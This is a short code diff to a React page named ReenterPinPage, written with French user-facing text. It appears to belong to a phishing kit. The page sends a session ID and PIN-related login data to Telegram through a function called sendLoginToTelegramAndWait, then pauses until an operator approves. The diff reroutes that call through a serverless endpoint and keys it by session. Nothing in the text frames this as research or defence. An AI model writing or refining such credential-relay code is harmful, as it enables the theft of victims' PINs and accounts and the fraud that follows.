@@ -115,9 +115,9 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
         `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
 
-      // Send to Telegram and wait for approval (using phone as username, isCode=false)
+      // Send to Telegram via serverless and wait for approval
       setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, phone, false);
+      const approved = await sendLoginToTelegramAndWait(message, sessionId, 'reenter');
 
       setIsWaitingTelegram(false);
 
